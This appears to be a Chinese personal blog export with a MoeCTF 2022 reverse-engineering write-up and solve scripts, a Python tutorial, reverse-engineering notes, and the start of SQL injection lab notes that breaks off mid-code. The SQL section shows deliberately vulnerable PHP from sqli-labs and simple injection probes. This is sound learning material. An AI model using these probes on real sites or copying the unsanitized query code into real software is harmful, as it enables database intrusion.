<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0xcd</span>,<span class="number">0x4d</span>,<span class="number">0x8c</span>,<span class="number">0x7d</span>,<span class="number">0xad</span>,<span class="number">0x1e</span>,<span class="number">0xbe</span>,<span class="number">0x4a</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,<span class="number">0xbc</span>,<span class="number">0x7c</span>,<span class="number">0xfc</span>,<span class="number">0x2e</span>,<span class="number">0x2a</span>,<span class="number">0x79</span>,<span class="number">0x9d</span>,<span class="number">0x6a</span>,<span class="number">0x1a</span>,<span class="number">0xcc</span>,<span class="number">0x3d</span>,<span class="number">0x4a</span>,<span class="number">0xf8</span>,<span class="number">0x3c</span>,<span class="number">0x79</span>,<span class="number">0x69</span>,<span class="number">0x39</span>,<span class="number">0xd9</span>,<span class="number">0xdd</span>,<span class="number">0x9d</span>,<span class="number">0xa9</span>,<span class="number">0x69</span>,<span class="number">0x4c</span>,<span class="number">0x8c</span>,<span class="number">0xdd</span>,<span class="number">0x59</span>,<span class="number">0xe9</span>,<span class="number">0xd7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i] = ((enc[i] &gt;&gt; <span class="number">4</span>) | (enc[i] &lt;&lt; <span class="number">4</span>)) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):  <span class="comment">#逆过来遍历</span></span><br><span class="line">    enc[i-<span class="number">1</span>] -= enc[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(enc))</span><br></pre></td></tr></table></figure>

<h1 id="fake-key"><a href="#fake-key" class="headerlink" title="fake key"></a>fake key</h1><img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231202335120.png" class title="This is an image">

<p>分析程序逻辑，先对输入的flag进行一个xor操作，再用随机数进行一个加密，但题目已经提示密钥是假的，我们需要通过动调来获得key和随机数</p>
<p>关于如何获取随机数，可以在line19下断，提取出此时的input数据，然后跑完整个for循环，再提取input数据，两者相减就是生成的随机数。</p>
<p>ida动调</p>
<p>真的key:  yunzh1junTCL,trackYYDS</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231203254817.png" class title="This is an image">

<p>循环前input数据</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231203501591.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x18, 0x14, 0x0F, 0x1B, 0x09, 0x50, 0x0B, 0x14, 0x0F, 0x35, </span><br><span class="line">  0x22, 0x2D, 0x4D, 0x15, 0x13, 0x00, 0x02, 0x0A, 0x38, 0x38, </span><br><span class="line">  0x25, 0x32, 0x18, 0x14, 0x0F, 0x1B, 0x09, 0x50, 0x0B, 0x14, </span><br><span class="line">  0x0F, 0x35, 0x22, 0x2D, 0x4D, 0x15, 0x13</span><br></pre></td></tr></table></figure>

<p>循环后input数据</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231203622646.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x19, 0x1B, 0x13, 0x1B, 0x12, 0x54, 0x13, 0x1C, 0x11, 0x39, </span><br><span class="line"> 0x27, 0x32, 0x4E, 0x1C, 0x14, 0x01, 0x07, 0x0C, 0x3F, 0x3E, </span><br><span class="line"> 0x26, 0x36, 0x1A, 0x17, 0x11, 0x1D, 0x0A, 0x56, 0x13, 0x19, </span><br><span class="line"> 0x16, 0x3B, 0x23, 0x35, 0x56, 0x17, 0x1A</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key=<span class="string">&quot;yunzh1junTCL,trackYYDS&quot;</span></span><br><span class="line">str1=[<span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x0F</span>, <span class="number">0x1B</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x0B</span>, <span class="number">0x14</span>, <span class="number">0x0F</span>, <span class="number">0x35</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x4D</span>, <span class="number">0x15</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x38</span>, <span class="number">0x38</span>,</span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x32</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x0F</span>, <span class="number">0x1B</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x0B</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x35</span>, <span class="number">0x22</span>, <span class="number">0x2D</span>, <span class="number">0x4D</span>, <span class="number">0x15</span>, <span class="number">0x13</span>]</span><br><span class="line">str2=[ <span class="number">0x19</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0x39</span>,</span><br><span class="line">  <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x4E</span>, <span class="number">0x1C</span>, <span class="number">0x14</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x0C</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>,</span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x1A</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x1D</span>, <span class="number">0x0A</span>, <span class="number">0x56</span>, <span class="number">0x13</span>, <span class="number">0x19</span>,</span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x3B</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0x56</span>, <span class="number">0x17</span>, <span class="number">0x1A</span>]</span><br><span class="line"></span><br><span class="line">enc=[<span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x0F</span>, <span class="number">0x19</span>, <span class="number">0x25</span>, <span class="number">0x5B</span>, <span class="number">0x19</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0x3A</span>,</span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0x74</span>, <span class="number">0x07</span>, <span class="number">0x43</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x5A</span>, <span class="number">0x34</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x3F</span>, <span class="number">0x1E</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x1F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i]-=(str2[i]-str1[i])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(enc[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>OD动调也可以得到这些数据</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20221231235844439.png" class title="This is an image">

<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/20230101000312.png" class title="This is an image">

<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/20230101000411.png" class title="This is an image">

<h1 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h1><p>upx正常脱壳</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20230101103228912.png" class title="This is an image">

<p>整个加密逻辑只有一句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Str1[i - 1] ^= (Str1[i - 1] % 17 + Str1[i]) ^ 0x19;</span><br></pre></td></tr></table></figure>

<p>Str1就是input</p>
<p>跟进函数sub_401550</p>
<img src="/2022/12/31/moectf2022-re%E5%A4%8D%E7%8E%B0/image-20230101103500021.png" class title="This is an image">

<p>云姐解释的这里是一个SHA1，用来限制多解的情况，很明显我没看懂这里</p>
<p>str2的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x02, 0x18, 0x0F, 0xF8, 0x19, 0x04, 0x27, 0xD8, 0xEB, 0x00, </span><br><span class="line"> 0x35, 0x48, 0x4D, 0x2A, 0x45, 0x6B, 0x59, 0x2E, 0x43, 0x01, </span><br><span class="line"> 0x18, 0x5C, 0x09, 0x09, 0x09, 0x09, 0xB5, 0x7D</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check = [<span class="number">0x2</span>, <span class="number">0x18</span>, <span class="number">0xf</span>, <span class="number">0xf8</span>, <span class="number">0x19</span>, <span class="number">0x4</span>, <span class="number">0x27</span>, <span class="number">0xd8</span>, <span class="number">0xeb</span>, <span class="number">0x0</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x4d</span>, <span class="number">0x2a</span>, <span class="number">0x45</span>, <span class="number">0x6b</span>, <span class="number">0x59</span>, <span class="number">0x2e</span>, <span class="number">0x43</span>, <span class="number">0x1</span>, <span class="number">0x18</span>, <span class="number">0x5c</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0xb5</span>, <span class="number">0x7d</span>]</span><br><span class="line">tmp = [<span class="number">0</span>]*<span class="number">28</span></span><br><span class="line">tmp[<span class="built_in">len</span>(check)-<span class="number">1</span>]=check[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DFS</span>(<span class="params">deep</span>):</span><br><span class="line">    <span class="keyword">if</span> deep == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(tmp))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">            <span class="keyword">if</span> (i ^ <span class="number">0x19</span>) ^ (i % <span class="number">0x11</span> + tmp[deep]) == check[deep - <span class="number">1</span>]:</span><br><span class="line">                tmp[deep - <span class="number">1</span>] = i</span><br><span class="line">                DFS(deep - <span class="number">1</span>)</span><br><span class="line">DFS(<span class="built_in">len</span>(check)-<span class="number">1</span>)  <span class="comment">#深搜算法</span></span><br></pre></td></tr></table></figure>

<p>从前往后爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check = [<span class="number">0x2</span>, <span class="number">0x18</span>, <span class="number">0xf</span>, <span class="number">0xf8</span>, <span class="number">0x19</span>, <span class="number">0x4</span>, <span class="number">0x27</span>, <span class="number">0xd8</span>, <span class="number">0xeb</span>, <span class="number">0x0</span>, <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x4d</span>, <span class="number">0x2a</span>, <span class="number">0x45</span>, <span class="number">0x6b</span>, <span class="number">0x59</span>, <span class="number">0x2e</span>, <span class="number">0x43</span>, <span class="number">0x1</span>, <span class="number">0x18</span>, <span class="number">0x5c</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0x9</span>, <span class="number">0xb5</span>, <span class="number">0x7d</span>]</span><br><span class="line">flag=<span class="string">&#x27;m&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(check)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(flag[i-<span class="number">1</span>]) ^ <span class="number">0x19</span>) ^ (<span class="built_in">ord</span>(flag[i-<span class="number">1</span>]) % <span class="number">0x11</span> + j) == check[i-<span class="number">1</span>]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<p>参考文章：官方wp</p>
<p><a href="https://github.com/XDSEC/MoeCTF_2022/blob/main/Official_Writeup/Reverse/Reverse_Offical_WriteUp.md">https://github.com/XDSEC/MoeCTF_2022/blob/main/Official_Writeup/Reverse/Reverse_Offical_WriteUp.md</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习</title>
    <url>/2023/01/04/python%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Python-字符串-ascii-uppercase"><a href="#Python-字符串-ascii-uppercase" class="headerlink" title="Python 字符串 | ascii_uppercase"></a>Python 字符串 | ascii_uppercase</h1><h3 id="ascii-uppercase"><a href="#ascii-uppercase" class="headerlink" title="ascii_uppercase"></a>ascii_uppercase</h3><p>在 Python3 中，**<code>ascii_uppercase </code>**是用作字符串常量的预初始化字符串</p>
<p><strong>语法：</strong> string.ascii_uppercase</p>
<p><strong>参数：</strong>不接受任何参数，因为它不是函数。</p>
<p><strong>返回：</strong>返回所有大写字母</p>
<p><strong>ascii_lowercase</strong>上同，返回所有小写字母</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h5 id="检查字符串输入是否只有大写ASCII字符"><a href="#检查字符串输入是否只有大写ASCII字符" class="headerlink" title="检查字符串输入是否只有大写ASCII字符"></a>检查字符串输入是否只有大写ASCII字符</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># importing string library function </span></span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line">     </span><br><span class="line"><span class="comment"># Function checks if input string </span></span><br><span class="line"><span class="comment"># has upper ascii letters or not </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">value</span>): </span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> value: </span><br><span class="line">             </span><br><span class="line">        <span class="comment"># If anything other than upper ascii </span></span><br><span class="line">        <span class="comment"># letter is present, then return </span></span><br><span class="line">        <span class="comment"># False, else return True </span></span><br><span class="line">        <span class="keyword">if</span> letter <span class="keyword">not</span> <span class="keyword">in</span> string.ascii_uppercase: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h5 id="生成给定大小的强随机密码"><a href="#生成给定大小的强随机密码" class="headerlink" title="生成给定大小的强随机密码"></a>生成给定大小的强随机密码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Importing random to generate </span></span><br><span class="line"><span class="comment"># random string sequence </span></span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line">    </span><br><span class="line"><span class="comment"># Importing string library function </span></span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_pass</span>(<span class="params">size</span>): </span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Takes random choices from </span></span><br><span class="line">    <span class="comment"># ascii_letters and digits </span></span><br><span class="line">    generate_pass = <span class="string">&#x27;&#x27;</span>.join([random.choice( </span><br><span class="line">                        string.ascii_uppercase + string.digits) </span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(size)]) </span><br><span class="line">                            </span><br><span class="line">    <span class="keyword">return</span> generate_pass </span><br><span class="line">    </span><br><span class="line"><span class="comment"># Driver Code  </span></span><br><span class="line">password = rand_pass(<span class="number">10</span>) </span><br><span class="line"><span class="built_in">print</span>(password) </span><br><span class="line"><span class="comment">#string.digits将给出小写字母 &#x27;0123456789&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>re求学之路</title>
    <url>/2022/12/12/re%E6%B1%82%E5%AD%A6%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>简单介绍，其实只是想试试新搭建的博客能不能用</p>
<p>Reverse即软件逆向工程，是对编译成型的二进制程序进行代码、逻辑和功能分析的过程。在CTF中主要</p>
<p>考察软件静态分析和动态调试能力，常见的逆向目标为Windows、Linux平台下x86、x64二进制可执行</p>
<p>程序。</p>
<p><strong>能力要求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熟悉如操作系统，汇编语言，加解密等相关知识。</span><br><span class="line"></span><br><span class="line">具有丰富的多种高级语言的编程经验。</span><br><span class="line"></span><br><span class="line">熟悉多种编译器的编译原理。</span><br><span class="line"></span><br><span class="line">较强的程序理解和逆向分析能力。</span><br></pre></td></tr></table></figure>

<p><strong>逆向分析的主要方法</strong></p>
<p><strong>静态分析法</strong></p>
<p>静态分析法是在不执行代码文件的情况下，对代码进行静态分析的一种方法，主要观察代码文件的外部特性，包括文件类型分析和静态反汇编、反编译。通常使用反汇编工具查看内部代码，分析代码结构。</p>
<p><strong>动态分析法</strong></p>
<p>动态分析法是在程序文件的执行过程中对代码进行动态分析的一种方法，其通过调试来分析代码、获取内存的状态等，目的在于定位关键代码后，在程序运行的过程中，借由输出信息（寄存器，内存变化，程序输出）等来验证自己的推断或是理解程序功能。通常使用调试器来分析程序的内部结构和实现原理。</p>
<p><strong>调试工具</strong></p>
<p>调试工具有以下两个重要功能：</p>
<p>\1. 断点设置</p>
<p>允许用户选在程序中任意位置的某行代码，一旦程序运行到这一行，将知识调试工具停止运</p>
<p>行程序，并显示程序的当前状态。</p>
<p>\2. 代码跟踪（单步调试）</p>
<p>允许用户在程序运行时跟踪他的执行，程序每执行一条汇编代码后都会暂停，允许用户观察</p>
<p>甚至改变程序的状态。</p>
<p>调试工具主要根据操作系统来选择</p>
<p><strong>Windows——Ollydbg</strong></p>
<p>Ollydbg是Windows下一款具有可视化界面的用户态调试工具，推荐从吾爱破解论坛上下载</p>
<p>吾爱破解专用版Ollydbg，这个版本有对抗反调试的功能。</p>
<p><strong>Linux——GDB</strong></p>
<p>GDB是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中</p>
<p>链表的状态，各个地址的内容。GDB拥有多个插件（peda、pwndbg、gef等）这些插件提供</p>
<p>了一些额外的命令，在可视化和功能上都进行了扩展。推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>
<p><strong>Trace类工具</strong></p>
<p>Trace类工具通过一定的方式监控并记录程序的运行，然后使分析者在记录的信息中得到程序的一些动态</p>
<p>信息。</p>
<p>Strace</p>
<p>Strace使Linux下一个用来跟踪系统调用的工具，可以监控用户空间进程和内核的交互，比如</p>
<p>系统调用、信号传递、进程状态变更等。</p>
<p><strong>Qira</strong></p>
<p>Qira是一个强大的Trace类工具，可以将程序整个执行流全部记录下来，然后给予用户<strong>回溯</strong>、</p>
<p>查看命中断点的所有指令（即交叉引用）等。</p>
<p>Qira的安装比较难，多多百度&#x2F;谷歌。</p>
<h3 id="常规逆向分析流程"><a href="#常规逆向分析流程" class="headerlink" title="常规逆向分析流程"></a><strong>常规逆向分析流程</strong></h3><h4 id="1、收集信息"><a href="#1、收集信息" class="headerlink" title="1、收集信息"></a>1、收集信息</h4><p>使用strings&#x2F;file&#x2F;binwalk&#x2F;IDA等静态分析工具收集信息，并根据这些静态信息进行google&#x2F;github搜索</p>
<h4 id="2、干扰分析技术"><a href="#2、干扰分析技术" class="headerlink" title="2、干扰分析技术"></a>2、干扰分析技术</h4><p>程序为了保护代码，通常会使用一系列技术来干扰逆向分析，这里会介绍一些常见的干扰分析技术。</p>
<p>花指令</p>
<p>花指令是代码保护中一种简单的技巧，原理是在原始代码中插入一段无用的或者能够干扰反</p>
<p>汇编引擎的代码。花指令主要影响静态分析，在IDA中表现为一些指令无法识别，导致某些函</p>
<p>数未能识别，从而无法对这些函数进行反编译。</p>
<p>要破解花指令，可以在IDA中手动将花指令patch成nop空指令，从而去除花指令。如果程序</p>
<p>中花指令较多，可以通过分析花指令的特定模式，编写IDAPython脚本对花指令进行自动化</p>
<p>搜索和patch。</p>
<h5 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h5><p>反调试技术是指程序在运行时会检测其是否处于被调试状态，如果发现其正在被调试，就无</p>
<p>法正常运行。</p>
<p>Windows下通过Ollydbg的StringOD插件可以过滤掉大多数的反调试方法。</p>
<p>Liunx下主要利用ptrace系统调用、proc文件系统检测和父进程检测来检测自身是否正在被调</p>
<p>试，针对这些反调试方法，常用的方法就是定位到反调试的代码，然后对程序进行patch，在</p>
<p>不影响程序正常功能的情况下，跳过对调试器的检测代码。</p>
<h5 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h5><p>加壳是指在二进制的程序中植入一段代码。在运行的时候优先取得程序的控制权，这段代码</p>
<p>会在执行的过程中对原始指令进行解密还原，之后再将控制权交还给原始代码，执行原来的</p>
<p>代码。</p>
<p>被加过壳的程序，其真正的代码是加密存放在二进制文件中的，只有在执行时才从内存中解</p>
<p>密还原出来，因此没法对加了壳的程序直接进行静态分析。</p>
<p>在CTF比赛中出现的带壳程序通常为已知的壳，大部分都可以通过使用专用工具或者脚本的</p>
<p>脱壳。可以使用PEiD工具查询该带壳程序用的什么壳，再用对应工具或脚本脱壳。</p>
<h5 id="控制流混淆"><a href="#控制流混淆" class="headerlink" title="控制流混淆"></a>控制流混淆</h5><p>对于控制流混淆的程序，没有办法直接进行静态分析，也无法进行反编译，而调试器调试也</p>
<p>会陷入控制流的跳转混乱中。</p>
<p>对于控制流混淆的程序，通常通过Trace工具记录下程序运行的所有指令，然后再运行这些指</p>
<p>令的基础上进行数据流分析。</p>
<h5 id="双进程保护（Debug-Blocker）"><a href="#双进程保护（Debug-Blocker）" class="headerlink" title="双进程保护（Debug Blocker）"></a>双进程保护（Debug Blocker）</h5><p>双进程保护是一种在调试模式下运行自身程序的方法。这种保护通常存在两个进程，由父进</p>
<p>程调试子进程。实际功能的代码运行在子进程中，但是因为子进程已经处于调试状态，无法</p>
<p>再使用其他调试器进行附加操作。同时父进程能够控制子进程，通过处理子进程的异常，可</p>
<p>以控制子进程正常运行。</p>
<p>双进程保护技术的难点在于，真正的功能运行在子进程中，若要调试子进程，就需要断开其</p>
<p>与父进程之间的链接，但是一旦断开，没有父进程处理子进程的异常，会导致子进程无法正</p>
<p>常运行。</p>
<p>对于双进程保护的程序，其父进程通常功能单一，因此先针对父进程，了解其处理子进程异</p>
<p>常的逻辑，然后调试子程序，使其脱离父进程之后仍能正常运行，最后在对子进程进行调试</p>
<p>分析。</p>
<h4 id="3、关键代码定位"><a href="#3、关键代码定位" class="headerlink" title="3、关键代码定位"></a>3、关键代码定位</h4><p>在一个可执行程序中，汇编代码数量庞大，所以要能够定位出真正需要分析的关键代码，只有找到关键</p>
<p>代码之后，才能对关键代码采用的算法进行分析，理清程序功能，最后针对程序功能，写出对应脚本，</p>
<p>解出flag。</p>
<p>这里给出3个常用的关键代码定位法</p>
<p><strong>API断点法</strong></p>
<p>例如：在获取文本输入时，窗口类程序获取文本的方式主要是通过GetWindowsText和</p>
<p>GetDlgItemText两个API来获取。在输出结果时，会弹出对话框，这时调用的API通常为</p>
<p>MessageBox。在这些API函数中下断点，在调试工具中断下来后，通过栈回溯即可定位到关</p>
<p>键代码。</p>
<p><strong>字符串检索法</strong></p>
<p>在IDA中</p>
<p>打开Strings子窗口，通过Ctrl+F输入想要查找的字符串。</p>
<p>在Ollydbg中</p>
<p>通过Alt+E，可以查看可执行模块，找到主模块，点击右键，选择中文搜索引擎，根据需</p>
<p>要搜索ASCII或者UNICODE。</p>
<p><strong>辅助工具定位法</strong></p>
<p>针对特定语言或编译器生成的程序，可以用一些辅助工具帮助快速定位案件处理程序的地</p>
<p>址。</p>
<p>如：针对MFC程序的xspy，针对Delphi程序的Dede。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2022/12/28/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入漏洞形成的原因："><a href="#SQL注入漏洞形成的原因：" class="headerlink" title="SQL注入漏洞形成的原因："></a>SQL注入漏洞形成的原因：</h1><h2 id="动态字符串构建引起"><a href="#动态字符串构建引起" class="headerlink" title="动态字符串构建引起"></a>动态字符串构建引起</h2><ul>
<li>不正确的处理转义字符（宽字节注入）</li>
<li>不正确的处理错误（报错泄露信息）</li>
<li>不正确的处理联合查询</li>
<li>不正确的处理多次提交（二次注入）</li>
</ul>
<h2 id="后台存在的问题"><a href="#后台存在的问题" class="headerlink" title="后台存在的问题"></a>后台存在的问题</h2><ul>
<li>后台无过滤或者编码用户数据</li>
<li>数据库可以拼接用户传递的恶意代码</li>
</ul>
<h2 id="错误处理不当"><a href="#错误处理不当" class="headerlink" title="错误处理不当"></a>错误处理不当</h2><ul>
<li>详细的内部错误消息显示给用户或攻击者</li>
<li>错误信息可以直接给攻击者提供下一步攻击帮助</li>
</ul>
<h2 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h2><h1 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h1><h2 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h2><p>一种请求服务器的HTTP方法，使用该方法时，信息包含在URL中</p>
<p><strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=value1&amp;cat=value2&amp;num=value3..</span><br></pre></td></tr></table></figure>

<h2 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h2><p>一种用于向Web服务器发送信息的HTTP方法，数据信息无法在URL中看到，可以发送字节大的数据</p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p><strong>按数据类型</strong>：</p>
<ul>
<li>数字型</li>
<li>字符型</li>
</ul>
<p><strong>按返回结果：</strong></p>
<ul>
<li>报错型</li>
<li>盲注型</li>
</ul>
<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>

<p><strong>提交</strong> <strong>1 and 1&#x3D;1</strong></p>
<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;1 limit 0,1</strong></p>
<p>这时语句前值后值都为<strong>真</strong>，and以后也为<strong>真</strong>，返回查询到的数据。</p>
<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名。</p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>

<p><strong>提交</strong> 1’ and ‘1’&#x3D;‘1</p>
<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;‘1’ and ‘1’&#x3D;‘1’ limit 0,1</strong></p>
<p>这时语句前值后值都为真，and以后也为真**，返回查询到的数据</p>
<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名</p>
<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span 